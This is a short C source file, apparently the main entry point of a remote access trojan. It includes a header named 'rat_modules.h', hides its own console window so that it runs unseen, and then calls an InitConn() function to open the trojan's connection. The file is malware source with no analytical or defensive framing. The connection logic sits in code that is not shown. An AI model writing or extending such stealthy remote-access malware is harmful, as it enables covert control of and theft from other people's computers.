#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include "rat_modules.h"


int main(void) {

    //Get the console window handle
    HWND consoleWindow = GetConsoleWindow();

    //Hide the window
    ShowWindow(consoleWindow, SW_HIDE);


	InitConn();
	

	return 0;
}